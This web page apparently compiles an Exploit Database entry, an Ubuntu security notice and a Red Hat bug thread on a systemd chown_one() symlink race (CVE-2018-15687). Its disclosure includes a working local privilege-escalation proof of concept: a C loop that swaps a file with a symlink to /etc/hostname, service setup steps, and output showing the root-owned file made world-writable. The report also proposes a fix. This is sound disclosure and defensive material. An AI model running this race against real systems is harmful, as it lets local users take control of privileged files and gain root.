**Vulnerable App:**

```
[I am sending this bug report to Ubuntu, even though it's an upstream
bug, as requested at
https://github.com/systemd/systemd/blob/master/docs/CONTRIBUTING.md#security-vulnerability-reports
.]

When chown_one() in the recursive chown logic decides that it has to change
ownership of a directory entry, it first changes ownership as follows:

        if (name)
                r = fchownat(fd, name, uid, gid, AT_SYMLINK_NOFOLLOW);
        else
                r = fchown(fd, uid, gid);
        if (r < 0)
                return -errno;

So far, this looks good. But then this happens:

        /* The linux kernel alters the mode in some cases of chown(). Let's undo this. */
        if (name) {
                if (!S_ISLNK(st->st_mode))
                        r = fchmodat(fd, name, st->st_mode, 0);
                else /* There's currently no AT_SYMLINK_NOFOLLOW for fchmodat() */
                        r = 0;
        } else
                r = fchmod(fd, st->st_mode);

This is dangerous, especially in the case where `name != NULL`.

First off: I don't think that the overall objective of this code block makes
sense. Yes, the kernel sometimes changes the mode when ownership is changed -
but that's only for set-UID binaries and set-GID binaries (but not
set-GID directories).
I'm pretty sure that setuid/setgid binaries aren't supposed to appear in these
directories anyway.

The problem here is that, as the comment explains,
`fchmodat(fd, name, st->st_mode, 0)` follows symlinks. The fchmodat() call is
guarded by a `S_ISLNK(st->st_mode)` check, but that's obviously racy and
therefore doesn't actually help.

My recommended fix is to just remove the offending code block. If, for some
crazy reason, you actually want to support changing the ownership of
setuid/setgid binaries, an alternative might be to do something like this:

    int fd2 = openat(fd, name, O_PATH|O_NOFOLLOW|O_CLOEXEC);
    if (fd2 >= 0) {
      fchmod(fd2, st->st_mode);
      close(fd2);
    }

To reproduce, as root, create a service with "Restart=always",
"StartLimitIntervalSec=0", "StateDirectory=test_service" and "User=user" (where
"user" is the name of an unprivileged account). Point "ExecStart" at a binary
that immediately exits:

========
int main(void) {
  return 0;
}
========

Then start the service.

Next, as the user the service is running as, create some entries in
/var/lib/test_service:

========
user@ubuntu-18-04-vm:~$ cd /var/lib/test_service/
user@ubuntu-18-04-vm:/var/lib/test_service$ touch foo
user@ubuntu-18-04-vm:/var/lib/test_service$ chmod 0666 foo
user@ubuntu-18-04-vm:/var/lib/test_service$ ln -s /etc/hostname foo2
user@ubuntu-18-04-vm:/var/lib/test_service$ ln foo foo_link
user@ubuntu-18-04-vm:/var/lib/test_service$ ls -la
total 8
drwxr-xr-x  2 user user 4096 Okt  8 16:42 .
drwxr-xr-x 67 root root 4096 Okt  8 15:30 ..
-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo
lrwxrwxrwx  1 user user   13 Okt  8 16:23 foo2 -> /etc/hostname
-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo_link
========

Create and run a helper that continuously switches "foo" and "foo2" with each
other:

========
user@ubuntu-18-04-vm:~$ cat exchange.c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <err.h>
#include <sys/syscall.h>
int main(int argc, char **argv) {
        char *base = argv[1], *p1 = argv[2], *p2 = argv[3];
        if (chdir(base)) err(1, "chdir");
        while (1) {
                if (syscall(__NR_renameat2, AT_FDCWD, p1, AT_FDCWD, p2, 2))
                        perror("renameat");
        }
}
user@ubuntu-18-04-vm:~$ gcc -o exchange exchange.c -O2
user@ubuntu-18-04-vm:~$ ./exchange /var/lib/test_service foo foo2
========

Change ownership of "foo_link" and the test_service directory to trigger the
permission fixup logic when the service restarts the next time:

========
user@ubuntu-18-04-vm:/var/lib/test_service$ chown user:cdrom foo_link .
========

Check whether it worked:

========
user@ubuntu-18-04-vm:/var/lib/test_service$ ls -la /etc/hostname .
-rw-r--r-- 1 root root   16 Jul  3 19:20 /etc/hostname

.:
total 8
drwxr-xr-x  2 user user 4096 Okt  8 16:45 .
drwxr-xr-x 67 root root 4096 Okt  8 15:30 ..
lrwxrwxrwx  1 user user   13 Okt  8 16:23 foo -> /etc/hostname
-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo2
-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo_link
========

If it didn't work (as in this example), retry the chown a few times. After a few
times, you should see this:

========
user@ubuntu-18-04-vm:/var/lib/test_service$ ls -la /etc/hostname .
-rw-rw-rw- 1 root root   16 Jul  3 19:20 /etc/hostname

.:
total 8
drwxr-xr-x  2 user user 4096 Okt  8 16:46 .
drwxr-xr-x 67 root root 4096 Okt  8 15:30 ..
-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo
lrwxrwxrwx  1 user user   13 Okt  8 16:23 foo2 -> /etc/hostname
-rw-rw-rw-  2 user user    0 Okt  8 16:16 foo_link
========

Another thing that might also go wrong, but that I haven't tested, is the
interaction with the mount.ecryptfs_private helper that comes with ecryptfs.
As far as I can tell, an attacker would be able to use mount.ecryptfs_private to
mount an ecryptfs inside the StateDirectory. This ecryptfs instance could then
function similar to a bind mount, causing systemd to change the ownership of
files that are e.g. in /etc. You might want to ensure that no files or
directories you access are located on an ecryptfs filesystem.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# USN-3816-1: systemd vulnerabilities

12 November 2018

Several security issues were fixed in systemd.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.10](/security/notices?release=cosmic)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [systemd](/security/cves?package=systemd) - system and service manager

## Details

Jann Horn discovered that unit\_deserialize incorrectly handled status messages

above a certain length. A local attacker could potentially exploit this via

NotifyAccess to inject arbitrary state across re-execution and obtain root

privileges. ([CVE-2018-15686](/security/CVE-2018-15686))

Jann Horn discovered a race condition in chown\_one(). A local attacker

could potentially exploit this by setting arbitrary permissions on certain

files to obtain root privileges. This issue only affected Ubuntu 18.04 LTS

and Ubuntu 18.10. ([CVE-2018-15687](/security/CVE-2018-15687))

It was discovered that systemd-tmpfiles mishandled symlinks in

non-terminal path components. A local attacker could potentially exploit

this by gaining ownership of certain files to obtain root privileges. This

issue only affected Ubuntu 16.04 LTS and Ubuntu 18.04 LTS. ([CVE-2018-6954](/security/CVE-2018-6954))

| [Description](show_bug.cgi?id=1639076#c0)  Sam Fowler    2018-10-15 02:35:14 UTC  ``` systemd is vulnerable to improper dereference of symlinks in the core/chown_recursive.c:chown_one() function. An attacker with local access can exploit this via services with certain configurations to modify the file permissions of arbitrary files.   ```  [Comment 1](show_bug.cgi?id=1639076#c1)  Riccardo Schirone    2018-10-22 07:18:52 UTC  ``` When using systemd's features CacheDirectory, LogsDirectory or StateDirectory together with the DynamicUser feature, systemd needs to recursively change ownership of those directories. While doing this, when the file is not a link the file mode is re-set to be sure the kernel doesn't change it (which could happen with SUID/SGID files), but an attacker may be able to bypass the link check and change the mode of any file in the filesystem.   ```  [Comment 2](show_bug.cgi?id=1639076#c2)  Riccardo Schirone    2018-10-22 07:43:57 UTC  ``` Statement:  This issue did not affect the versions of systemd as shipped with Red Hat Enterprise Linux 7 as the vulnerable code was introduced in a newer version of the package.   ```  [Comment 3](show_bug.cgi?id=1639076#c3)  Riccardo Schirone    2018-10-26 06:22:43 UTC  ``` Patch currently under review at: <https://github.com/systemd/systemd/pull/10517>   ```  [Comment 4](show_bug.cgi?id=1639076#c4)  Riccardo Schirone    2018-10-26 06:24:23 UTC  ``` Created systemd tracking bugs for this issue:  Affects: fedora-all [[bug 1643367](show_bug.cgi?id=1643367 "CLOSED ERRATA - CVE-2018-15687 systemd: Dereference of symlinks in chown_recursive.c:chown_one() allows for modification of file privileges [fedora-all]")]   ```  [Comment 6](show_bug.cgi?id=1639076#c6)  Riccardo Schirone    2018-10-29 07:02:35 UTC  ``` Acknowledgments:  Name: Ubuntu, Jann Horn (Google Project Zero)   ```  [Comment 7](show_bug.cgi?id=1639076#c7)  Riccardo Schirone    2018-10-31 07:54:06 UTC  ``` Upstream patch: <https://github.com/systemd/systemd/commit/dc81f52c4d07de0c24f16edf889120780d9ae734>   ```  [Comment 8](show_bug.cgi?id=1639076#c8)  Product Security DevOps Team    2019-07-12 13:06:04 UTC  ``` This bug is now closed.
